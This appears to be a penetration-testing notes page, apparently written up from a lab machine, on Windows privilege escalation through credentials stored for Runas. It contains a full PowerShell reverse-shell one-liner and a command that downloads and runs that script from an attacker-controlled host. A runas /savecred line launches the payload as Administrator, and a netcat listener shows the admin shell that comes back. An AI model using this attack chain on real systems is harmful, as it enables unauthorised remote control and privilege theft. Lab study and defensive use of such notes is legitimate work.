---
description: Windows Privilege Escalation using Runas.
---

# Runas (Stored Credentials)

Runas is a windows command line tool that allows users to run other tools, programs or commands with permissions of another user. If a user's credentials are cached in the system, the Runas command can be run using the /savecred flag which will automatically authenticate and execute the command as that user.

### Cmdkey

Cmdkey is a Windows command-line utility that is used to create, list, and delete stored user names and passwords or credentials.

With `cmdkey /list` we can retrieve a stored credential for "ACCESS\Administrator

```
C:\Users\security>cmdkey /list

Currently stored credentials:
    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

Windows may save credentials for several reasons

* sysadmin configured an application to run as an admin with /savecred specified
* sysadmin choose to use it to not repeatedly enter admin password
* run an application with elevated privileges.

{% hint style="info" %}
For a powershell reverse shell

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.4',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Then host the ps1 file and call it from the target: `START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.4:8000/ps_rev.ps1')`

`START` will start a new process without creating a window for it and also operating independently of the original session, such as a Telnet session.
{% endhint %}

### Privilege escalation

<details>

<summary>Enumerate .lnk files for runas commands</summary>

```
> Get-ChildItem "C:\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt
> ForEach($file in gc .\shortcuts.txt) { Write-Output $file; gc $file |
Select-String runas }
```

</details>

To escalate privielges we can start powershelll using runas with ACCESS\administrator

```powershell
# runas
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.4:8000/ps_rev.ps1')"

# runas 
runas user passwd powershell.exe -r 10.10.14.9:1443
```

And on our listener we receive the connection

```
nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.98] 49171
whoami
zencorp\administrator
PS C:\Windows\system32> 
```

> So check cmdkey /list to check for stored credentials which can be used with runas, like `runas /user:ACCESS\Administrator`
